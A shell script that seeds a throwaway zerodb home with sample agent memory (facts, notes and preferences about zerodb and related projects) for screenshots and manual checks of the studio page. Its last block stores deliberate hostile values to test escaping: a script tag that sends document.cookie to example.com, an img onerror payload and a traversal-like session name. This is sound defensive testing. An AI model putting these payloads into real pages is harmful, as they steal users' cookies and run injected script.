#!/bin/sh
# Seeds a throwaway zerodb home with realistic memory, for studio screenshots and manual checks.
# Usage: crates/zerodb/studio/seed.sh <empty dir>
# Then: HOME=<dir> XDG_DATA_HOME= ZERODB_HOME= zerodb studio
# The seeded home's server keeps running. The script prints its pid, to stop it with kill.
set -eu

dir=${1:?usage: seed.sh <empty dir>}
mkdir -p "$dir"
dir=$(cd "$dir" && pwd -P)
if [ -n "$(ls -A "$dir")" ]; then
  echo "seed.sh: $dir is not empty" >&2
  exit 2
fi
bin=${ZERODB_BIN:-zerodb}

# The pid of the home's server, from its LOCK file on macOS or Linux. Empty before it starts.
pid() {
  for lock in "$dir/Library/Application Support/zerodb/data/LOCK" "$dir/.local/share/zerodb/data/LOCK"; do
    if [ -f "$lock" ]; then sed -n 's/^pid=\([0-9]*\).*/\1/p' "$lock"; return; fi
  done
}
# A failed step leaves running the server that the first step started.
trap 'code=$?; if [ "$code" -ne 0 ] && [ -n "$(pid)" ]; then echo "seed.sh: failed. Stop the home server with: kill $(pid)" >&2; fi' EXIT

# Only HOME is set, so the real home is never touched. XDG_DATA_HOME would win on Linux, and
# ZERODB_HOME everywhere, so both are cleared.
run() { HOME="$dir" XDG_DATA_HOME= ZERODB_HOME= "$bin" "$@" >/dev/null; }
note() { run append --agent "$1" --session "$2" --role "${4:-assistant}" --content "$3"; }
fact() { run fact set --agent "$1" --key "$2" --content "$3"; }

fact copilot user/prefs/commits "Sign off with git commit -s. Never add Co-authored-by trailers, squash merges included."
fact copilot user/prefs/writing "No em dashes. Sentences under 25 words."
fact vscode-copilot user/prefs/review "Every PR gets a Copilot review. Fix findings, re-request, merge on green CI."
fact copilot user/prefs/azure "Justify and report Azure spend. Deallocate VMs after each run."

note copilot zerodb "Fixed MCP results that broke on commit_time_ns past 2^53 (#85). Integers that large now go out as strings. Reads work again in Copilot CLI."
fact copilot repo/zerodb/decisions/mcp-integers "MCP tool results send integers past 2^53 as strings (#85). Copilot parsed commit_time_ns as BigInt and failed to serialize it."
note vscode-copilot zerodb "Added readOnlyHint to the 4 read tools (#86). VS Code runs fact_get and memory_search without asking now."
fact copilot repo/zerodb/decisions/old-index "Considered an inverted index for memory_search. A scan answers in under 2 s at our size."
fact copilot repo/zerodb/decisions/search "memory_search walks records newest first with no index. 1,000,000 visits per call, LSN cursor to page."
run fact set --agent copilot --key repo/zerodb/decisions/old-index --delete
fact copilot repo/zerodb/perf/fsync "APFS F_FULLFSYNC costs about 6 ms. Group commit spreads it over writers."
note copilot zerodb "Measured group commit on the M2: 80 requests per group at 128 writers, 859 groups/s." 
fact copilot repo/zerodb/perf/fsync "APFS F_FULLFSYNC costs 4 to 8 ms on the M2. Group commit spreads it over up to 80 requests."
note user zerodb "Keep the chat-start block under 6,000 characters. Models lose detail long before 200K tokens." user
fact vscode-copilot repo/zerodb/decisions/p1-connect "zerodb connect vscode|copilot writes the MCP entry and the sessionStart hook. The block is at most 6,000 characters."
note copilot zerodb "P1 merged: connect, hook, MCP roots (#88 #90 #91 #95). Hook block measured at 717 characters in 102 ms."
fact copilot repo/zerodb/process/pr "Squash-merge after green CI and a clean Copilot review. Poll reviews by head commit."
note vscode-copilot zerodb "Live check in VS Code: the sessionStart hook ran on resume and the block reached the chat."

fact vscode-copilot repo/agentic-operator-core/runtime/adapters "Runtimes go through pkg/runtime.Registry: argo (default), pod and kagent. No if-type branches in Reconcile."
note vscode-copilot agentic-operator-core "Added the kagent adapter through the unstructured client. No typed Go dependency on kagent."
fact copilot repo/agentic-operator-core/security/egress "A default-deny egress NetworkPolicy seals every runtime's pods. Adapters get it through governance labels."
note copilot agentic-operator-core "gVisor label injector now covers BYO pods. Egress seal checked on argo, pod and kagent."
fact copilot repo/agentic-operator-core/approvals/hmac "Direct-path approvals need a webhook-stamped HMAC. Refused without APPROVAL_STAMP_KEY_FILE."
note copilot agentic-operator-core "Approval stamps verified end to end on kind. 3 of 3 refused without the key file."

fact vscode-copilot repo/clawdlinux-website/copy/positioning "Lead with air-gapped attestation and the zero-egress seal. The runtime under the pod is a detail."
note vscode-copilot clawdlinux-website "Rewrote the hero around attestation. Removed kagent as the subject of problem sentences."
fact vscode-copilot repo/clawdlinux-website/build/deploy "Deploys from main through GitHub Pages. Preview with npm run dev on port 4321."
note vscode-copilot clawdlinux-website "Fixed 2 broken links in the docs nav. Lighthouse accessibility 100 on the home page."

fact copilot user/prefs/writing "No em dashes. Sentences under 20 words. Numbers as digits."
note copilot zerodb@feat/studio "Studio plan: 2 read routes, a loopback bridge, then the page. Style: achromatic ledger."
fact copilot repo/zerodb/decisions/studio "zerodb studio is a read-only page on loopback. The tenant token stays in the bridge, never in the browser."
note copilot zerodb "Opened #89: test socket paths overflow sun_path on macOS. Default root moves under /tmp."

# Hostile values. The studio must show them as text and send nothing off 127.0.0.1.
note copilot '../x#y?z%' 'Pasted from a web page: <script>fetch("https://example.com/?c="+document.cookie)</script> <b>bold?</b>'
fact copilot 'repo/zerodb/<img src=x onerror=alert(1)>' 'A key with markup in it. It must show as text.'

echo "seeded $dir"
echo "open it with: HOME=$dir XDG_DATA_HOME= ZERODB_HOME= zerodb studio"
echo "its server runs as pid $(pid). Stop it with: kill $(pid)"
